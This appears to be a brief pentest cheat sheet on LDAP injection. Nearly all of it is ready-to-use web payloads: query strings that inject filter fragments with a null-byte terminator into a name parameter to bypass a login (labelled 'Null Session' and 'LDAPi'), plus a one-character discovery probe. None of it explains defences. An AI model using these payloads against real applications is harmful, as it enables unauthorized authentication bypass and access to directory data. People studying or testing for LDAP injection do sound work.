# LDAP Injection

## Exploitation
- Null Session
  - ```example2.php?name=*)(cn=*))%00&password=fff```
- LDAPi
  - ```example2.php?name=*)(cn=hacker))%00&password=fff```

## Discovery
- .php?name=)
